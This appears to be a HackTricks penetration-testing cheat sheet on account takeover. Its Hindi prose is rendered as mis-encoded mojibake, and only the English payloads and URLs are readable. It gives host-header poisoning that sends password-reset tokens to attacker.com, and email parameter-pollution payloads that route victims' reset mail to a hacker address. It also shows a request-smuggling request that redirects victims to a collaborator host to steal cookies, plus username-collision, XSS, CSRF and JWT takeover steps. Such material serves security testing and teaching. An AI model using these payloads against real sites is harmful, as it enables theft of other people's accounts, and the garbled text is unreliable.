# рдкрдВрдЬреАрдХрд░рдг рдФрд░ рдЕрдзрд┐рдЧреНрд░рд╣рдг рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдПрдБ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдЧреНрд░рд╣рдг

### рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдкрдВрдЬреАрдХрд░рдг

* рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ
* рдИрдореЗрд▓ рдореЗрдВ рд╡рд┐рд╡рд┐рдзрддрд╛ рдЬрд╛рдВрдЪреЗрдВ:
* рдЕрдкрд░рдХреЗрд╕
* \+1@
* рдИрдореЗрд▓ рдореЗрдВ рдХреБрдЫ рдЬреЛрдбрд╝реЗрдВ
* рдИрдореЗрд▓ рдирд╛рдо рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рдЕрдХреНрд╖рд░ (%00, %09, %20)
* рдИрдореЗрд▓ рдХреЗ рдмрд╛рдж рдХрд╛рд▓реЗ рдЕрдХреНрд╖рд░ рдбрд╛рд▓реЗрдВ: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕реВрдЪреАрдХрд░рдг

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рдкрдВрдЬреАрдХреГрдд рд╣реЛ рдЪреБрдХрд╛ рд╣реИред

### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддреЗ рд╕рдордп рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ).\
рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдк рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### SQL рдЗрдВрдЬреЗрдХреНрд╢рди

[**рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](sql-injection/#insert-statement) рдкрдВрдЬреАрдХрд░рдг рдлреЙрд░реНрдо рдореЗрдВ **SQL рдЗрдВрдЬреЗрдХреНрд╢рди** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдпрд╛ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### Oauth рдЕрдзрд┐рдЧреНрд░рд╣рдг

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдПрдБ

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### рдИрдореЗрд▓ рдмрджрд▓реЗрдВ

рдкрдВрдЬреАрдХреГрдд рд╣реЛрдиреЗ рдкрд░ рдИрдореЗрд▓ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрди рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдорд╛рдиреНрдп рд╣реИ рдпрд╛ рдЖрдк рдЗрд╕реЗ рдордирдорд╛рдиреЗ рдИрдореЗрд▓ рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдзрд┐рдХ рдЬрд╛рдВрдЪ

* рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдбрд┐рд╕реНрдкреЛрдЬреЗрдмрд▓ рдИрдореЗрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **рд▓рдВрдмрд╛** **рдкрд╛рд╕рд╡рд░реНрдб** (>200) **DoS** рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИ
* **рдЦрд╛рддрд╛ рдирд┐рд░реНрдорд╛рдг рдкрд░ рджрд░ рд╕реАрдорд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**
* username@**burp\_collab**.net рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рдХреЙрд▓рдмреИрдХ** рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ

## **рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЕрдзрд┐рдЧреНрд░рд╣рдг**

### рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рд░реЗрдлрд░рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реАрдХ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. рдЕрдкрдиреЗ рдИрдореЗрд▓ рдкрддреЗ рдкрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ
2. рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
3. рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓реЗрдВ рдирд╣реАрдВ
4. рдХрд┐рд╕реА рднреА рддреГрддреАрдп рдкрдХреНрд╖ рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг: Facebook, twitter)
5. Burp Suite рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВ
6. рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рд▓реАрдХ рдХрд░ рд░рд╣рд╛ рд╣реИред

### рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЬрд╣рд░реАрд▓рд╛рдкрди <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЕрдиреБрд░реЛрдз рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВ
2. Burp Suite рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЗрдбрд░реНрд╕ рдХреЛ рдЬреЛрдбрд╝реЗрдВ рдпрд╛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВ: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. рд╕рдВрд╢реЛрдзрд┐рдд рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдПрдВ\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ URL рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреИрд╕реЗ: `https://attacker.com/reset-password.php?token=TOKEN`

### рдИрдореЗрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдкрд░ IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓реЗрдВ** рд╕реБрд╡рд┐рдзрд╛ рдкрд░ рдЬрд╛рдирд╛ рд╣реЛрдЧрд╛ред
2. Burp Suite рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВред
3. рдЗрд╕реЗ рд░рд┐рдкреАрдЯрд░ рдЯреИрдм рдкрд░ рднреЗрдЬреЗрдВ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ ID/рдИрдореЗрд▓\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рдХреЛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рд░ рдмрд╛рд░ рдЕрджреНрд╡рд┐рддреАрдп рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдХрд┐ рдЯреЛрдХрди рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдпрд╣ рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди рд░рд╣рддрд╛ рд╣реИ, рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрддреНрдкрд╛рджрди рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрдордЬреЛрд░ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* Timestamp
* UserID
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдИрдореЗрд▓
* рдкреНрд░рдердо рдирд╛рдо рдФрд░ рдЙрдкрдирд╛рдо
* рдЬрдиреНрдо рддрд┐рдерд┐
* Cryptography
* рдХреЗрд╡рд▓ рд╕рдВрдЦреНрдпрд╛
* рдЫреЛрдЯрд╛ рдЯреЛрдХрди рдЕрдиреБрдХреНрд░рдо (рд╡рд░реНрдг \[A-Z,a-z,0-9] рдХреЗ рдмреАрдЪ)
* рдЯреЛрдХрди рдкреБрди: рдЙрдкрдпреЛрдЧ
* рдЯреЛрдХрди рд╕рдорд╛рдкреНрддрд┐ рддрд┐рдерд┐

### рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛ <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдИрдореЗрд▓ рдХреЗ рд▓рд┐рдП API/UI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЕрдиреБрд░реЛрдз рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг: test@mail.com
2. рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ `resetToken` рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВред
3. рдлрд┐рд░ рдЯреЛрдХрди рдХреЛ рдПрдХ URL рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреИрд╕реЗ `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕рдВрдШрд░реНрд╖ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. рдкреАрдбрд╝рд┐рдд рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рдорд╛рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░реЗрдВ, рд▓реЗрдХрд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕реЗ рдкрд╣рд▓реЗ рдФрд░/рдпрд╛ рдмрд╛рдж рдореЗрдВ рд╕рдлреЗрдж рд╕реНрдерд╛рди рдбрд╛рд▓реЗрдВред рдЙрджрд╛рд╣рд░рдг: `"admin "`
2. рдЕрдкрдиреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВред
3. рдЕрдкрдиреЗ рдИрдореЗрд▓ рдкрд░ рднреЗрдЬреЗ рдЧрдП рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд░реЗрдВред
4. рдирдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдореЗрдВ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВред

CTFd рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдерд╛ред\
рджреЗрдЦреЗрдВ: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### рдХреНрд░реЙрд╕ рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рдпрд╛ рдПрдХ рд╕рдмрдбреЛрдореЗрди рдореЗрдВ XSS рдЦреЛрдЬреЗрдВ рдЕрдЧрд░ рдХреБрдХреАрдЬрд╝ рдореВрд▓ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рд╕реНрдХреЛрдк рдХреА рдЧрдИ рд╣реИрдВ: `*.domain.com`
2. рд╡рд░реНрддрдорд╛рди **рд╕рддреНрд░ рдХреБрдХреА** рдХрд╛ рд▓реАрдХ рдХрд░реЗрдВред
3. рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░реЗрдВред

### HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. **smuggler** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. рдПрдХ рдЕрдиреБрд░реЛрдз рддреИрдпрд╛рд░ рдХрд░реЗрдВ рдЬреЛ `POST / HTTP/1.1` рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` рд▓рдХреНрд╖реНрдп рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЛ burpcollab рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рдЙрдирдХреЗ рдХреБрдХреАрдЬрд╝ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП\
3\. рдЕрдВрддрд┐рдо рдЕрдиреБрд░реЛрдз рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдЗрд╕ рдмрдЧ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреА рд╣реИрдВ:
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦрд╛рддрд╛ рдЕрдкрд╣рд░рдг <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдмрдирд╛рдПрдВ, рдЙрджрд╛рд╣рд░рдг: тАЬрдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдд: рд╕рдмрдорд┐рдЯ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ HTML рдлреЙрд░реНрдотАЭ
2. рдкреЗрд▓реЛрдб рднреЗрдЬреЗрдВ

### JWT рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦрд╛рддрд╛ рдЕрдкрд╣рд░рдг <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ ID / рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде JWT рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВ
* рдХрдордЬреЛрд░ JWT рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
